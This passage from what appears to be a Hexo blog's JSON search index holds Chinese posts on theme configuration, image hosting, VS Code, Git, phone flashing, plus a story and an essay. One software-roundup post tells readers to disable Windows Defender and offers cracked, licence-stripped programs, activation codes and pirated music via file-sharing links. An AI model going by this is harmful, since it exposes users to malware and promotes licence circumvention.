scriptFrom: local\n  pluginRootPath: live2dw/\n  pluginJsPath: lib/\n  pluginModelPath: assets/\n  tagMode: false\n  debug: false\n  model:\n    use: live2d-widget-model-tororo # 模型：https://huaji8.top/post/live2d-plugin-2.0/\n  display:\n    position: left\n    width: 150\n    height: 350\n\n  mobile:\n    show: true\nadmin:\n  deployCommand: &#39;hexo-pubish.bat&#39;`&lt;/pre&gt;\n\n**_注意这里的use参数是上面安装的那个模型全名_**\n\n### [](#取消看板娘 &quot;取消看板娘&quot;)取消看板娘\n\n将配置中的`enable`设置成`false`即可。\n\n### [](#卸载插件 &quot;卸载插件&quot;)卸载插件\n\n运行命令下载插件，删除配置信息：\n\n1.卸载模型：npm uninstall live2d-widget-model-模型名\n2.卸载live2d插件：npm uninstall hexo-helper-live2d\n3.去掉站点_config.yml下的配置信息即可。\n\n## [](#添加实时发布说说页面（Artitalk） &quot;添加实时发布说说页面（Artitalk）&quot;)添加实时发布说说页面（Artitalk）\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212059.png)\n\n教程：\n\n## [](#自定义不使用主题模板渲染的独立页面 &quot;自定义不使用主题模板渲染的独立页面&quot;)自定义不使用主题模板渲染的独立页面\n\n效果：\n\n![](https://gitee.com/wkkif/PicGoimg/raw/master/img/20200814212511.png)\n\n用途：加入一些不用主题的页面，如404页面，新建一个导航页，具有自己独立的样式，可以放一些自己的作品，相册什么的，以下就介绍这种独立页面的实现方法。\n\n使用 Hexo 提供的跳过渲染配置，在博客根目录的配置文件 `_config.yml` 里找到 `skip_render` 关键字，在后面添加想要跳过渲染的页面，比如我们创建 `\\source\\about\\index.html`， 配置文件填写：`skip_render: about\\**`，那么就表示 `\\source\\about` 里所有的文件将跳过渲染，里面的文件将会被直接复制到 public 文件夹，此时就会得到一个独立的 about 页面；官方文档：[https://hexo.io/docs/configuration](https://hexo.io/docs/configuration)\n\n如：\n\n&lt;pre&gt;`# 屏蔽渲染\nskip_render:\n  - &quot;404.md&quot;\n  - &quot;Nobaidu/**&quot;\n\n这里面对404.html页面屏蔽渲染，对Nobaidu文件夹下的html文件屏蔽渲染\n参考文章：\nhexo-theme-matery\n【Hexo】Hexo 主题 Matery 配置\nHexo+yilia添加Live2d看板娘\n","slug":"个人博客搭建（4）：matery-主题调教（持续更新-）","date":"2020-08-13T16:00:00.000Z","categories_index":"教程","tags_index":"hexo,matery","author_index":"kif"},{"id":"b872df3febc88e94f5046a1ac79f9c20","title":"个人博客搭建（5）：网页页尾鱼塘效果美化","content":"","slug":"个人博客搭建：网页页尾鱼塘效果美化","date":"2020-08-13T16:00:00.000Z","categories_index":"教程","tags_index":"hexo,matery","author_index":"kif"},{"id":"759a9a125e3b4bd3c266e8ed8726fe91","title":"Win好软推荐","content":"这期推荐一些个人在电脑使用中用到的提高工作（游戏）效率的好软件\n前排提醒：所有软件资源均来自网络。\n关闭Win自带definderwindows 10中自带杀毒软件Windows Defender，但是对于下面分向的大多是第三方软件，自带的杀毒软件往往会删掉软件，使用者或者不喜欢安装杀毒软件的用户怎么关闭它成为了难题，这篇文章会告诉你如何临时关闭windows defender或者永久关闭它。\n1.选择“开始”按钮 ，然后选择“设置” &gt;“更新和安全” &gt;“Windows 安全中心”。打开了Windows Defender操作界面，依次打开“病毒和威胁防护”-“病毒和威胁防护设置”\n\n\n2.在“病毒和威胁防护”设置界面，关闭“实时保护”，关闭“云提供的保护”，关闭“自动提交样本”这三项。\n如果按钮是灰色无法修改，那么可能你的第三方软件已通过其他方式为您已经关闭了。\n\n之后可以安装火绒等管家替代definder管理电脑。\n解压工具解压工具是用来解压压缩包， 压力太大不适合用这个，建议去捏方便面\nWinrar[WinRAR]是一款强大的压缩文件管理器，它提供了RAR和ZIP文件的完整支持，能解压ARJ、CAB、LZH、ACE、TAR、GZ、UUE、BZ2、JAR、ISO格式文件。\n下面的大部分软件会用Zip压缩包的形式分享，所以下载下挺方便的\n下载链接：\nhttps://wws.lanzous.com/iYmNvfjqeqf\n使用自带解压工具解压教程：\nhttps://jingyan.baidu.com/article/a378c960d0cb10b328283002.html\n下载解压后会得到一下文件\n\n双击打开EXE后缀文件即可运行\n\n之后解压压缩包会自动使用此软件\n去广告弹窗广告火绒去除电脑弹窗广告首选 火绒 呀！\n下载链接\n\n点击下载安装，免费版在弹窗拦截方面已经很厉害了，\n打开方式：\n\n\n\n对于没有自动识别的弹窗也可以使用截图拦截功能，在弹窗出现的时候，使用此功能选择弹窗，对其拦截！\n\n之后就再也不担心突然弹出令人尴尬的广告了。\n浏览器广告这里推荐浏览器使用 电脑自带的  Microsoft Edge或者 谷歌浏览器（Chrome），火狐浏览器（Firefox）\n这三款浏览器比较简约，其余360 UC浏览器之类的都是用的他们的浏览器内核，是对这几个浏览器的包装，而且这三款浏览器可以安装一款神器—游猴插件\n\n游猴里面的好多插件可以使电脑拥有好多功能，例如破解付费vip视屏，去广告，这部分在后面再提。\n这里给大家推荐的软件是\nADGUARD作为号称是世界上最高级的广告拦截程序！Adguard Premium 是摆脱恼人广告，在线跟踪，保护您远离恶意软件的最佳方式。AdGuard 使您网络冲浪更快速，更安全，更安逸！\nAdGuard for Windows PC版 不只是一款广告拦截软件，它还组合了可获取最佳网络体验所需功能的多用途工具。其可拦截广告和危险网站，加速网页载入，保护儿童的在线安全。轻松阻挡 (比“隐藏过滤”更高效更彻底) 广告、减少页面加载时间、富媒体或其他非标准类型的广告，在对网页垃圾信息进行屏蔽后可加快页面载入速度。同时 Adguard 还支持反钓鱼并对反恶意软件以及网站进行过滤。\n官方网站\n\n购买价格：\n\n网络下载链接\n使用教程：\n下载后解压在一固定目录下,此软件是免安装版，所以删除后就不能用了哦。\n解压打开后会有如下文件\n\n双击打开AdguardPortable.exe\n\n启用保护\n打开设置\n\n安装浏览器助手就可以在浏览器里除掉广告了\n\n打开浏览器就可以在右上角看到这个图标\n\n电脑管家提到电脑管家，可能大家首先想到360电脑管家或者腾讯的，但在使用中大家会发现当下载360电脑管家之后过几天你就拥有了360浏览器，360解压等等360全家桶，这种捆绑式很让人头疼，甚至于卸载都卸载不干净。这里给大家推荐两款专业的软件。\nwisecare 365官网\n\n网络资源 https://wws.lanzous.com/iLVDRfjjjqd\n激活教程\n解压之后会得到如下文件\n\n注册信息txt里面提供了一些激活码\n当现实未激活时，可以用这些激活码激活\n\n软件提供了很多功能\n其中 计划任务可以定时清理电脑垃圾\n\nCcleaner官网：https://www.ccleaner.com/ccleaner\nCCleaner pro 是由英国 Piriform 工作室开发的最著名，且广受好评的系统清理优化及隐私保护软件，也是该工作室的主打和首发产品，支持自定义清理规则，增强了应用程序清理范围和效果。可以有效清除各种系统垃圾文件及应用程序垃圾，同时具备系统优化功能，可以对临时文件夹、历史记录、注册表冗余条目等进行垃圾清理，附带启动项管理、软件卸载功能。不含任何间谍软件和垃圾程序。支持包括简体中文在内的31国语言界面!\nCCleaner pro 是一款免费的系统优化和隐私保护工具。主要用来清除Windows系统不再使用的垃圾文件，以腾出更多硬盘空间。它的另一大功能是清除使用者的上网记录。\n感谢th_sjy大神的修改和分享，特点如下：\n\n去除了无用文件、语言文件夹，去除了版本检测、自动更新，去除了许可证验证，集成了许可证文件无需注册运行即为专业版。不再卡顿、不再提示新版本更新、许可证永久有效。\n此破解版绿色原生便携，配置信息不写注册表！\n技术员增强版和专业增强版相比，技术员增强版清理功能更多，而且多了很多自定义选项。\nProfessional 为专业版、Business 为商业版、Technician 为技术员版。\n\n网络资源\n\n浏览器这部分前面也提到了 推荐浏览器使用 电脑自带的  Microsoft Edge或者 谷歌浏览器（Chrome），火狐浏览器（Firefox）\n谷歌浏览器（Chrome）下载：https://www.google.cn/chrome/index.html\n浏览器除了前面提到的游猴以外，还可以安装很多扩展程序，下载扩展程序可以到chrome网上应用店\n打开方法：\n\n\nchrome网上应用店网址：https://chrome.google.com/webstore/category/extensions?hl=zh-CN\n\n下面给大家推荐一些扩展程序：\n1.AdGuard浏览器助手Beta 1.0.13计划这个就是前面ADGUARD的插件\n\n2.哔哩哔哩助手: bilibili.com 综合辅助扩展1.2.21下载：哔哩哔哩助手\n点击添加到Chrome即可\n\n\n功能：\n点击浏览器右上角图标即可设置\n\n\n\n\n3.Momentum 1.17. 41下载：Momentum 1.17. 41\n\n功能：\n大家新标签页时显示更美观的标签页\n音乐下载全网付费音乐免费下载软件，前排提醒，低调使用\nMusicTools下载地址\n\n\n搜索后可免费下载\n软件设置里设置下载目录，下载的歌曲会存在目录下\n\n护眼软件FluxPortable 4.118\nf.lux是款功能简单实用的电脑护眼神器，这款软件非常的小巧，是您眼睛的健康专家，使您的眼睛受到的辐射减少，软件主要的功能就是为了帮助用户快速的调节您的电脑显示屏的亮度，而且换是根据室内的光线来进行快速的调节，使您的眼睛一直处于舒服的状态等，当然我还是推荐Iris护眼神器，大家可以在网站搜索获取这个软件\n网络资源：https://wws.lanzous.com/iVus0fjlcxa\n解压后会得到如下文件\n\n双击打开FluxPortable.exe\n\nPDF文件浏览器PDFelement一款功能强大的pdf阅读器，解锁多种功能，方便电脑打开教材文件学习\n\n网络资源：https://cloud.189.cn/t/iAnmQ3jI7nyu\n免安装版本，下载之后打开exe文件即可\n工具集utools强烈安利！！集成了好多工具，方便使用\nuTools是一个极简、插件化、跨平台的现代化桌面软件。通过自由选配丰富的插件，打造你得心应手的工具集合。\n通过快捷键（默认alt+space）就可以快速呼出这个搜索框。它相当聪明，可以支持输入、拖拽、自动粘贴等作为输入源，相应的插件也早已准备就绪，统一的设计风格和操作方式，助你高效的得到结果。\n当你熟悉它后，能够为你节约大量时间，让你可以更加专注地改变世界。\n官网：https://u.tools/\n\n使用方法：\n使用快捷键 ALT + 空格键快速打开，在输入框里输入小工具名 如“剪贴板” ，按enter打开\n点击右边图标可以打开主面板，可以安装插件工具\n\n本地文件搜索软件everthing下载链接：https://www.voidtools.com/zh-cn/\n\n当我们要找某一个文件却忘记放到哪儿的时候，一般会使用自带的搜索工具（当然上个Utools也有搜索的功能，可以选择那个）\n\n但这个方法搜索速度非常慢\n\nEverthing搜索：\n\n明显速度快了好多。\n哔哩哔哩哔哩uwp是第三方开发者开发的哔哩哔哩玩的uwp应用，界面个人感觉很清新，功能也相对完整，之前一般都是在浏览器上看，现在用上这个uwp感觉还可以\n下载：https://wws.lanzous.com/i5QcXeehm7e\n使用：\n下载后会得到以下文件\n\n打开   60520B029E250.4264454043325_1.3.8.0_x64__5aa7k9th7aafp.appx    就可以开始安装\n\n设置里面可以切换模式，提供了两种模式\n\n\n","slug":"Win好软推荐","date":"2020-08-11T16:00:00.000Z","categories_index":"推荐","tags_index":"Win","author_index":"kif"},{"id":"cf1f0eef142c868dc6803aea191ba123","title":"个人博客搭建（3）:Typora+PicGo+Github/Gitee搭建免费稳定的图床","content":"PicGo一个用于快速上传图片并获取图片URL链接的工具\n\nPicGo官网：PicGo下载：仓库地址按照官方安装方法安装\n注：在安装的时候安装目录千万不能选C:\\Program Files\\下的任何地方，因为PicGo无法解析这一路径，如果你不知道安装在哪里的话，选择仅为我安装，否则在设置Typora时会出现错误：\nGithub仓库图床新建Public Github仓库创建Repository点击”New repository”按钮，仓库名字随意\n新生成一个Personal access tokens生成一个Token用于操作GitHub repositorySettings --&amp;gt; Developer Settings --&amp;gt; Personal access tokens\n\n\n![Personal access tokens&#96;](https://cdn.jsdelivr.net/gh/wkif/ImageHosting/kif_img&#x2F;20200721123456.png)\n生成Token\n\n会生成如上图的一串token，这串token之后不会再显示，所以第一次看到的时候，可以建个文本文件保存，忘记了只有重新生成，每次都不一样。\nPicGo配置配置Github图床填写说明\n仓库名：按照“账户名&#x2F;仓库名的格式填写”，比如我的是wkif&#x2F;ImageHosting\n分支名：填写masterTOKEN：Token粘贴在这里路径：可留空，如需自己填写记得末尾加上&#x2F;设定自定义域名：自定义域名的作用是在上传图片后成功后，PicGo会将“自定义域名+上传的图片名”生成的访问链接，放到剪切板上，这里我用到了jsdeliver  的免费CDN加速，自定义域名需要按照这样去填写：https://cdn.jsdelivr.net/账户名/仓库名/master，比如我的是：https://cdn.jsdelivr.net/gh/wkif/ImageHosting\nTypora配置PicGo下载Typora下载地址\n配置\n验证设置是否正确\n\n错误解决错误1：\nfailed to launch PicGo app: Command failed: C:\\Program Files\\PicGo\\PicGo.exe &#39;C:\\Program&#39; �����ڲ����ⲿ���Ҳ���ǿ����еĳ��� ���������ļ���\n前面提到的安装的问题，不要放在c盘下\n错误2：\n&#96;\nFailed to fetch\n&#96;\nway:\n\n\ngitee的后续在写吧！","slug":"个人博客搭建（3）-Typora-PicGo-Github-Gitee搭建免费稳定的图床","date":"2020-07-20T16:00:00.000Z","categories_index":"教程","tags_index":"hexo","author_index":"kif"},{"id":"8fffe42ae1cb23d36525f11277ac4f35","title":"shmily","content":"shmilySometimes some little things can teach us a lot.\nMy grandparents were married for over half a century, and played their own special game from the time they had met each other. The goal of their game was to write the word”shmily”in a surprise place for the other to find. They took turns leaving”shmily”around the house, and as soon as one of them discovered it, it was their turn to hide it once more. They dragged”shmily”with their fingers through the sugar and flour containers to await whoever was preparing the next meal. They smeared it in the dew on the windows overlooking the patio where my grandma always fed us warm, homemade pudding with blue food coloring.”Shmily”was written in the steam left on the mirror after a hot shower, where it would reappear bath after bath. At one point, mygrandmothereven unrolled an entire roll of toilet paper to leave”shmily”on the very last sheet. There was no end to the places”shmily”would pop up. Little notes with”shmily”scribbled hurriedly were found on dashboards and car seats, or taped to steering wheels. The notes were stuffed inside shoes and left under pillows.”Shmily”was written in the dust upon the mantel and traced in the ashes of thefireplace. Thismysteriousword was as much a part of my grandparents’house as the furniture.\nIt took me a long time before I was able to fullyappreciatemy grand-parents’game.Skepticismhas kept me from believing in true love-one that is pure and enduring. However, I never doubted my grandparents’relationship. They had love down pat.It was more than their flirtatious little games; it was a way of life. Their relationship was based on a devotion andpassionateaffectionwhich not everyone is lucky to experience. Grandma and Grandpa hold hands every chance they could. They stole kisses as they bumped into each other in their tiny kitchen. They finished each other’s sentences and shared the dailycrosswordpuzzle and word jumble.. My grandma whispered to me about how cute my grandpa was, how handsome and old he had grown to be. She claimed that she really knew”how to pick’em.”Before every meal they bowed their heads and gave thanks, marveling at theirblessings: a wonderful family, good fortune, and each other. But there was a dark cloud in my grandparents’life: my grandmother had breast cancer. The disease had first appeared ten years earlier. As always, Grandpa was with her every step of the way.\nHe comforted her in their yellow room, painted that way so that she could always be surrounded by sunshine, even when she was too sick to go outside. Now the cancer was again attacking her body. With the help of a cane and my grandfather’s steady hand, they went to church every morning. But my grandmother grew steadily weaker until, finally, she could not leave the house anymore. For a while, Grandpa would go to church alone, praying to God to watch over his wife. Then one day, what we all dreaded finally happened. Grandma was gone.”Shmily.”It was scrawled in yellow on the pink ribbons of my grandmother’s funeral bouquet.\nAs the crowd thinned and the last mourners turned to leave, my aunts, uncles, cousins and other family members came forward and gathered around Grandma one last time. Grandpa stepped up to my grandmother’s casket and, taking a shaky breath and then he began to sing to her. Through his tears , the song came, deep and slow.\nThank you，grandpa and grandma，for letting me see.\nS-h-m-i-l-y: See How Much I Love You.\nBy Laura Jeanne Allen\n知道我有多爱你我的祖父和祖母结婚已逾半个世纪，然而多少年来，他们彼此间不倦地玩着一个特殊的游戏：在一个意想不到的地方写下“Shmily”这个词留待对方来发现。他们轮换着在屋前房后留下“Shmily”，一经对方发现，就开始新的一轮。 他们用手指在糖罐和面箱里写下“Shmily”，等着准备下一餐饭的对方来发现；他们在覆着霜花的玻璃上写下“Shmily”；一次又一次的热水澡后，总可以看见雾气蒙罩的镜子上留下的“Shmily”。 有时，祖母甚至会重卷一整卷卫生纸，只为了在最后一片纸上写下“Shmily”。 没有“Shmily”不可能出现的地方。仓促间涂写的“Shmily”会出现在汽车坐垫上，或是一张贴在方向盘轴心的小纸条上。这一类的字条会被塞进鞋子里或是压在枕下。 “Shmily”会被书写在壁炉台面的薄尘上，或是勾画在炉内的灰底上。这个神秘的词，像祖父母的家具一样成了他们房间的一部分。 直到很久以后，我才能完全理解祖父母之间游戏的意义。年轻时我不懂得爱——那种纯洁且历久弥坚的爱。然而，我从未怀疑过祖父母之间的感情。他们彼此深爱。他们的小游戏已远非调情消遣，那是一种生活方式。他们之间的感情是基于一种深挚的爱和献身精神，不是每一个人都能体验到的。 祖父和祖母一有机会就彼此执手相握。他们在小厨房里错身而过时偷吻；他们说完彼此的半截句子；他们一起玩拼字和字谜游戏。祖母常忘情地对我耳语祖父有多可爱迷人，依然还是那么帅气。她骄傲地宣称自己的确懂得“如何选择”。每次餐前他们垂首祈祷时，感谢他们受到的诸多福佑：一个幸福的家庭、好运道和拥有彼此。 可是一片乌去遮蔽了祖父母的家：祖母的癌恶化了。首次发现是在10年前。跟以往一样，祖父总是跟祖母肩并肩地走过人生艰难之旅的每一步。为了安慰祖母，祖父将他们的卧房喷涂成黄色，这样在祖母病重不能出屋时，亦能感到周围的阳光。 起先，在祖父坚实的手臂和拐杖的帮扶下，他们每天清晨一起去教堂散步和默祷。但随着祖母日见虚弱，终于，祖父只能独自去教堂，祈求上帝看顾他的妻子。 然而那一天，我们担心忧惧的事终于还是发生了，祖母去世了。\n“Shmily”写在祖母葬礼上花束的黄色缎带上。当人群散去，叔伯、姑姑和其他的家庭成员又走上前来最后一次围聚在祖母身旁。祖父步向祖母的灵柩，用颤抖的声音轻轻的唱起“知道我有多么爱你……”透过悲伤的泪，这歌声低沉轻柔地飘入耳来……我终于明白了他们特殊小游戏的意义“S— h— m— I— l— y”：“See how much I love you（知道我多么爱你）”。 因悲伤而颤栗着，我永远无法忘记那一刻.谢谢你们，祖父祖母，是你们让我懂得了什么是爱 。来自：https://baike.baidu.com/item/shmily/130197\n","slug":"shmily","date":"2020-07-12T16:00:00.000Z","categories_index":"","tags_index":"","author_index":"kif"},{"id":"d0721fbd2a7afdfb558cd48589abf75b","title":"vs code 开发微信小程序","content":"这里推荐大家使用号称“宇宙第一IDE”的编辑器——vscode。安装方法看博客上一篇文章，主要介绍一下几个vscode插件，在vscode中搜索插件关键字点击安装即可。\n\n小程序助手让vscode 提供对 .wxss .wxml 文件后缀的支持\nminapp支持微信小程序标签、属性的智能补全，并且提示中包含文档内容（同时支持原生小程序、mpvue 和 wepy 框架，并提供 snippets）。\nwechat-snippet这个插件主要的功能就是代码辅助，代码片段自动完成，可以作为上个插件的补充。\nwxml这款插件用于将wxml代码进行高亮显示，并且提供代码格式化的功能，可将代码格式化为较易阅读的样式。\nvscode wxml提供微信小程序代码的提示对wxml文件进行格式化\nwechat-snippet\n有了上面这几款插件，便可以开始高效地撸代码了。至于代码的调试以及效果的查看，当然还是得打开微信开发者工具。将编辑器隐藏，调试工具调到最大，快速找到元素的位置，修改样式，Ctrl+S，提交代码，一顿操作猛如虎。\n下面这是我的界面，可以把微信开发程序仅打开模拟器，放在右边，左边用vscode写好代码后，鼠标点击到 右边，ctrl+r刷新就可以看到效果了。\n","slug":"vs-code-开发微信小程序","date":"2020-07-12T16:00:00.000Z","categories_index":"教程","tags_index":"微信小程序,VS code","author_index":"kif"},{"id":"94dfcc20f8c5e5494e0b9e69d08e22b8","title":"vs code下载安装","content":"本文介绍Win上安装vs code方法\n首先下载vscode安装软件下载链接\n选择vscode版本（根据自己的操作系统选择相应的版本）\n傻瓜式安装，一直下一步，直接到完成\n环境变量（这步骤也是默认的，因为改编辑器是微软提供的，会自动配置path）\n安装成功（到此步骤已经安装成功了，下面的部署式配置VSCode和简单的使用）\n将默认英文改成中文步骤１.Ctrl+Shift+P打开搜索框输入Configure Display Language命令\n修改完成之后，CTRL＋Ｓ保存\n步骤２：要查找的语言在“扩展”视图（Ctrl + Shift + X）中搜索语言包步骤３：重启vscode就可以了，重启之后，就变成中文版","slug":"vs-code下载安装","date":"2020-07-12T16:00:00.000Z","categories_index":"","tags_index":"VS CODE","author_index":"kif"},{"id":"2960c753fe0b5d1e41f4b97a42071328","title":"个人博客搭建（2）:配置gitalk评论","content":"","slug":"个人博客搭建（2）-配置gitalk评论","date":"2020-06-30T16:00:00.000Z","categories_index":"教程","tags_index":"hexo","author_index":"kif"},{"id":"65d93436f3826c4df5f8047ccf1ad814","title":"总会有人陪你奇奇怪怪","content":"讲起爱情，其实爱情刚开始都是你情我愿，是共喝一杯奶茶都觉得很甜，是说不完的话，也是聊不完的天。\n渐渐地，就算是特意为对方准备了惊喜，也从对方眼睛里明显看到没有了期待。我们开始怀疑，难道爱情里的耐心也有保质期。\n时间一到，联系变成负担，关心变成干扰，就连一举一动，都透着我在等着你回报的意味。\n也许都市人繁忙的生活，简短的爱情就像电影《他其实没那么喜欢你》说的那样：\n有手机、有快速拨号、甚至有语音拨号，有时压根没想打电话，电话就从裤兜里拨出去了，为什么没有时间打电话。\n如果真的喜欢你就不会忘记，如果忘记说明他不在乎你失望。\n“忙”就是恋爱上的大规模杀伤性武器，是“混蛋”的同义词，混蛋就是用忙敷衍你的那个人。\n或许我们可以活在聊天记录营造的美好里，活在他还爱我只是他太忙了的想象里，但是这个仅由自己一己之力撑起来的美梦，一戳就破。\n就像以前看失恋三十三天的时候，记得《失恋33天》里面有一句台词我很喜欢：\n感谢命运让我们这样结束，不用对我觉得抱歉，我不稀罕你的抱歉，我不稀罕你说的亏欠，我要的就是这样对等的关系。\n一段感情里，在起点时我们彼此相爱，到结尾时，互为仇敌，你不仁我不义。我要你知道，我们始终势均力敌。\n成年人的感情，进退都应该把握分寸。\n如果余生你不主动找我，我这辈子都不会再与你有交集。\n但只要你与我说话，我看见了一定秒回，或者你说想见我，就算是刀山火海也要以最快的速度出现在你的面前。\n所以，承认吧，我们要的并不是聊天记录维持的爱情。\n承认我们都做到了爱对方这件事，却终究没能做好陪对方一起走下去的准备。\n就像如今的网恋可以讲是当下流行的一种社交吧。无论是青春懵懂的学生，还是已经踏足社会的成年人，都会接触到网恋一词。\n喜怒哀乐都只能透过手机传达，我感觉欠缺一种爱情里的实在，有时候挂住对方如果透过手机来表达总比见一面欠点真情流露。网恋我支持但思念还是要靠见面。被惦记是幸福的所以想念就要去见对方。\n就像前些日子，在网上看到一个特别温馨的小故事：\n楼道有一则广告，广告词写着“太阳能维修”，下面有人用笔接了一句：“月亮可更换”。\n路过的女生觉得这句话可爱，便把它分享给了喜欢的男孩，没想到男孩很快回复她：“星星不闪包退换”。\n那一刻，我好像忽然明白了一个道理：人这一辈子，遇到爱遇到性都不稀罕，稀罕的是遇到了解。\n就好像比起穿得漂不漂亮，他更在意你穿得舒不舒服；比起一昧追问你的情绪低落缘由，他会轻轻牵起你的手，虽然我不知道怎么回事，但我想先带你去吃饭，我会陪着你。\n毕竟每个灵魂与生俱来都是孤独的，可总会遇到另一个能与之发生共鸣的灵魂，然后在尘世间相互慰藉。\n这时候，你就会觉得，人间真的好值得。还记得在最近看的一档综艺节目里，重新解锁了当年偶像吴尊的另一面。\n现实生活里，他幼稚又爱碎碎念，就连他的妻子林丽莹都吐槽说，你可以娘，但不要那么啰嗦。\n后来这句话成为吴尊好友们调侃他的金句，他也不生气，还借此来打趣逗乐林丽莹。\n生活平淡，其实真的没有那么多惊天动地的惊喜轮番上演，更多的时候，是对方为你做的一点点努力，堆积起来，换取命运手里的巧克力，带给你甜蜜和欢愉。\n人这一辈子，会说很多很多的话，也会做很多很多的事，能遇到一个对你事事有回应，件件有着落的人，却不容易。\n这样的人，他懂你的奇奇怪怪，也愿意陪你可可爱爱，愿你我都能遇到这样的人。\n在这七月临近的日子，希望会遇见一个懂你的人，懂你的快乐和忧伤，懂你的心酸和无奈，能懂你的累，懂你的苦，懂你的倔强，也懂你的坚持。\n不言不语，不是不说，只是不想说，无声无息，不是无心，只是没人懂。真正喜欢你的人不一定是最懂你的人，但他一定是最愿意去懂你的人。往后余生，找一个懂你的人，知你悲欢，解你忧愁。\n\n","slug":"总会有人陪你奇奇怪怪","date":"2020-06-28T16:00:00.000Z","categories_index":"生活","tags_index":"","author_index":"kif"},{"id":"fb47e8dc82076330efa1141bf68628eb","title":"C语言思维导图","content":"\n注：转自：hirak0\n","slug":"C语言思维导图","date":"2020-06-24T16:00:00.000Z","categories_index":"教程","tags_index":"C语言","author_index":"kif"},{"id":"1ffd2b825ff7a7b9d543e83619386e6e","title":"Win 上安装Git和node.js","content":"本文介绍Win上安装Gitd 和node.js方法个人安装的环境：（快速安装基本简单；下一步默认其实也可以；看图就懂）\nWindows10 64bit\nGit 2.13.0(下载 git网址 ： https://git-scm.com/download）\n\n安装步骤安装https://cdn.jsdelivr.net/gh/wkif/CDN/img/git/1.png\n路径选择\n选择安装组件当然建议全选哈\n组件\n创建菜单文件夹\n修改系统的环境变量\n选择SSL的证书\n\n\n\n\n\n\n\n\nhttps：（全称：Hyper Text Transfer Protocol over Secure Socket Layer）简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。\n\n配置行尾结束符\n配置终端仿真\n\n\n\n\n\n\n\n\n\n大多数其他Cygwin&#x2F;MSYS终端一样，MinTTY也是基于pseudo终端(“pty”)设备的。但是MinTTY并不能完全替代windows的命令提示符。windows上自带简单的文本输出的原生态的命令提示符通常可以很好的工作，但交互性更好的诸如MinTTY这样的应用程序却可能出现故障——虽然通常都有应对方案。这就是为什么MinTTY不能完全替代windows自带的命令提示符\n其他的配置–默认即可\n等待安装测试\n后续如果中文没有正常显示，请求鼠标右击选择“option”选项，更换语言即可中文\n转自：作者：weir_will链接：https://www.jianshu.com/p/414ccd423efc来源：简书\nnode.js下载链接：https://nodejs.org/en/安装步骤：一路默认就行（安装路径根据自己需要更改）\n验证软件正确安装同时按下Win键和R键（或者点击“开始菜单”-&gt;点击“运行”）,打开运行窗口,输入“cmd”然后输入以下命令，结果与下图相同则说明安装正确，若不正确可以卸载软件重新安装\ngit --version\nnode -v\nnpm -v\n\n","slug":"Win-上安装Git和node-js","date":"2020-06-17T16:00:00.000Z","categories_index":"教程","tags_index":"Win,git,node.js","author_index":"kif"},{"id":"2363820b2dc1d8f836edaa6b054ce535","title":"玩机汇总（一）：刷机常识，双清，BL，REC，TWRP","content":"  本文介绍手机刷机常识，双清，BL，REC，TWRP\n\n前排提示：本文转载自一加社区：http://www.oneplusbbs.com/thread-3851619-1-1.html\n对于刷机里面一些概念的理解首先，小白们的手机出了问题，论坛里的大佬们提出了解决方法，小白们却还是不会操作，根目录是什么呢，双清又是啥？下面我就对一些操作做一些简单的解释：\nBL锁BL锁就是bootloader锁，BL从安卓问世以来一直存在，它的功能在我看来应该是限制用户刷第三方ROM和降级系统。在锁住bl的情况下，用户是根本不可能刷第三方ROM和第三方recovery的，最多也就是刷个基于官方的精简包。bl还有一个恶心的限制就是root，所有要root的机器，都必须解锁才能获取。那有人就问了，为什么以前的老机器和安卓4点几的机子都可以一键root呢，这是因为以前的机器bl锁等级低，我们可以利用bl锁的漏洞，绕过bl解锁。然而现在的系统BL等级比较高，自然就无法绕过BL锁去root了。\nRECREC是Recovery的缩写，是每部安卓机出厂时自带的恢复模式，不过那都是官方的Recovery。Recovery就是像是电脑上的小型winPE系统，winPE可以在电脑上安装操作系统，或者做些备份、管理的工作。如果把手机比喻成房屋，那么地皮就像手机的硬件，房子像手机系统，建房子的各种工具就是就是Recovery了。官方Recovery只能用来刷入官方的系统，如果你想刷入别的系统，只能通过第三方Recovery来实现，但是，你平时所用到的在线升级也就是OTA升级，是基于官方Rec的，如果你刷入了第三方Rec，OTA升级就会失败。\nTWRPTWRP是国外android爱好者开发的一个第三方REC，全名是：TeamWin Recovery Project，也是我们现在刷第三方ROM通常用到的REC。\n双清`  　wipe data/factory reset：清除用户数据并恢复出厂设置\n  　wipecache partition：清除系统缓存 ，\n  　一般刷机前执行，具体看资源发布者的要求。`\n\n三清` 　 wipe data/factory reset：清除用户数据并恢复出厂设置\n  　wipe cache partition：清除系统缓存\n  　wipe dalvik cache：清除安卓虚拟机缓存\n  　具体看资源发布者的要求。\n\n## [](#四清 \"四清\")四清\n\n　　wipe data/factory reset：清除用户数据并恢复出厂设置\n　　wipe cache partition：清除系统缓存\n　　wipe dalvik cache：清除安卓虚拟机缓存\n　　wipe system：清除系统\n　　该操作可以更干净地刷入新系统，但并不建议也尽量不要四清，具体看资源发布者的要求。\n　　在这里我要说一下，很多人会觉得四清五清等多清会让刷入的系统更干净，其实这是一种误区，这样子很容易引起手机卡信号基带异常，例如电信卡无法出现4G+等情况出现，内存卡异常等问题，很多人说刷机过后信号没了，就是刷机多清的问题，除了首次刷机需要格式化内存卡，刷回官方固件的时候会自动清卡以外，其他时候完全没必要多清。\n       System这个分区基本包含了整个安卓操作系统，包括安卓用户界面、和所有预装的系统应用程序。擦除这个分区，会删除整个安卓系统，但不会导致不能启动。你可以通过进入Recovery程序，安装一个新ROM，也就是新的安卓系统。双清三清四清会清空个人的用户数据包括 ：应用程序、短信信息、联系人、通讯录、应用数据等等…，但不会清空内置卡如 图片、音乐、个人文件等等（此话来源于DK大佬……懒得打直接复制了）。\n\n## [](#根目录 \"根目录　　\")根目录　　\n\n楼主想了一下，觉得有必要为小白们科普一下什么是根目录。根目录指逻辑驱动器的最上一级目录，它是相对子目录来说的。点开手机内部储存看到的就是手机的根目录，同理，在电脑上也是一样，打开“我的电脑”，双击C盘就进入C盘的根目录，双击D盘就进入D盘的根目录，点开游戏文件夹看到的就是游戏的根目录。\n\n# [](#刷机过程和图文操作详解 \"刷机过程和图文操作详解\")刷机过程和图文操作详解\n\n## [](#如何在无需解BL锁不ROOT的情况下刷官方系统？ 